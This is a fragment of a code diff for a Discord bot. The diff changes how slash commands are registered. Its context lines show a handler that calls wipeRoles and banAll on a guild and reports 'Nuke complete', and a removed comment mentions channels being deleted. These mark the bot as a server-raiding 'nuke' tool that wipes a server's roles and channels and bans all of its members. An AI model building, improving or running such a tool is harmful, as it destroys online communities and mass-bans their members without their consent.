@@ -128,11 +128,17 @@ const commands = [
 client.once('ready', async () => {
   console.log(`logged in as ${client.user.tag} | ${client.guilds.cache.size} guilds`);
   const rest = new REST({ version: '10' }).setToken(TOKEN);
+  
   try {
+    console.log('Clearing old global commands...');
+    // مسح الأوامر القديمة مثل /gg
+    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: [] });
+    
+    console.log('Registering new commands...');
     await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
-    console.log('slash commands registered.');
+    console.log('Slash commands registered successfully.');
   } catch (err) {
-    console.error('register failed:', err);
+    console.error('Register failed:', err);
   }
 });
 
@@ -174,7 +180,6 @@ client.on('interactionCreate', async (interaction) => {
       if (doWipeRl) await wipeRoles(guild, speed);
       if (doBan)    await banAll(guild, speed);
 
-      // Try to send completion message (might fail if channel was deleted)
       await interaction.editReply({ content: 'Nuke complete ✅' }).catch(() => {});
     } catch (err) {
       await interaction.editReply({ content: `Error: ${err.message}` }).catch(() => {});
